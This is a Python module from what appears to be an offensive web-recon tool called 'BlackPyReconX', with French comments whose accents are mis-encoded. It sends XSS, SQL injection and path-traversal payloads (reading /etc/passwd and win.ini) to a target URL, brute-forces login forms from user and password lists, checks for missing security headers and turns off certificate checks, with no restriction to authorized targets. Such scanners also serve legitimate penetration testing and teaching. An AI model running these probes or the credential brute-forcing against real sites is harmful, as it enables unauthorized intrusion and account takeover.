import requests
from urllib.parse import urljoin
from pathlib import Path
import os
import urllib3

from modules.utils import is_valid_ip  # utilis√© si extension future

# üîá D√©sactiver avertissements SSL (utile pour sites vuln√©rables HTTP/HTTPS non certifi√©s)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# üìÇ Fichier de sortie
OUTPUT_FILE = Path(__file__).resolve().parent.parent / "outputs" / "web_vulns.txt"

# üß† Headers g√©n√©riques
HEADERS = {
    "User-Agent": "BlackPyReconX Scanner"
}

def detect_xss(url):
    """D√©tection XSS basique par injection JavaScript"""
    payload = "<script>alert(1)</script>"
    test_url = f"{url}?q={payload}"
    try:
        r = requests.get(test_url, headers=HEADERS, timeout=5, verify=False)
        if payload in r.text:
            return f"[XSS] {test_url}"
    except Exception as e:
        print(f"‚ùå Erreur XSS : {e}")
    return None

def detect_sqli(url):
    """D√©tection SQLi simple par injection GET"""
    payloads = ["'", "' OR '1'='1", "'--", "' OR 1=1 --", "';--"]
    vulnerable = []
    for p in payloads:
        test_url = f"{url}?id={p}"
        try:
            r = requests.get(test_url, headers=HEADERS, timeout=5, verify=False)
            if any(keyword in r.text.lower() for keyword in ["sql", "mysql", "syntax", "error", "odbc"]):
                vulnerable.append(f"[SQLi] {test_url}")
        except Exception as e:
            print(f"‚ùå Erreur SQLi : {e}")
    return vulnerable

def detect_lfi(url):
    """D√©tection Local File Inclusion (Linux + Windows)"""
    paths = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
    for p in paths:
        test_url = f"{url}?file={p}"
        try:
            r = requests.get(test_url, headers=HEADERS, timeout=5, verify=False)
            if "root:" in r.text or "[extensions]" in r.text:
                return f"[LFI] {test_url}"
        except Exception as e:
            print(f"‚ùå Erreur LFI : {e}")
    return None

def brute_force_login(url, users, passwords):
    """Bruteforce POST sur un formulaire d'authentification simple"""
    found = []
    for u in users:
        for p in passwords:
            try:
                data = {"username": u, "password": p}
                r = requests.post(url, data=data, headers=HEADERS, timeout=5, verify=False)
                if "Welcome" in r.text or r.status_code == 302:
                    found.append(f"[Bruteforce] {u}:{p} => {url}")
            except Exception as e:
                print(f"‚ùå Erreur bruteforce {u}:{p} : {e}")
    return found

def check_headers(url):
    """V√©rifie les headers HTTP de s√©curit√© courants"""
    issues = []
    try:
        r = requests.get(url, headers=HEADERS, timeout=5, verify=False)
        headers = r.headers
        if "X-Frame-Options" not in headers:
            issues.append("[Headers] X-Frame-Options missing")
        if "Content-Security-Policy" not in headers:
            issues.append("[Headers] Content-Security-Policy missing")
        return issues
    except Exception as e:
        print(f"‚ùå Erreur headers : {e}")
        return []

def save_results(vulns):
    """Sauvegarde les r√©sultats dans outputs/web_vulns.txt"""
    try:
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            for v in vulns:
                f.write(v + "\n")
        print(f"‚úÖ R√©sultats enregistr√©s dans {OUTPUT_FILE}")
    except Exception as e:
        print(f"‚ùå Erreur de sauvegarde des r√©sultats : {e}")

def run_web_scanner(target_url):
    """Lance toutes les d√©tections de vuln√©rabilit√©s web"""
    print(f"[‚Ä¢] Analyse web de : {target_url}")
    vulns = []

    xss = detect_xss(target_url)
    if xss:
        vulns.append(xss)

    sqli = detect_sqli(target_url)
    if sqli:
        vulns.extend(sqli)

    lfi = detect_lfi(target_url)
    if lfi:
        vulns.append(lfi)

    headers = check_headers(target_url)
    vulns.extend(headers)

    # Brute force (si fichiers dispo)
    user_file = Path(__file__).resolve().parent.parent / "data" / "users.txt"
    pass_file = Path(__file__).resolve().parent.parent / "data" / "passwords.txt"
    if user_file.exists() and pass_file.exists():
        try:
            with open(user_file, encoding="utf-8") as uf, open(pass_file, encoding="utf-8") as pf:
                users = [u.strip() for u in uf if u.strip()]
                passwords = [p.strip() for p in pf if p.strip()]
                found = brute_force_login(target_url, users, passwords)
                vulns.extend(found)
        except Exception as e:
            print(f"‚ùå Erreur lecture bruteforce : {e}")

    if vulns:
        save_results(vulns)
    else:
        print("[!] Aucune vuln√©rabilit√© d√©tect√©e.")

# Exemple CLI :
# run_web_scanner("http://testphp.vulnweb.com")
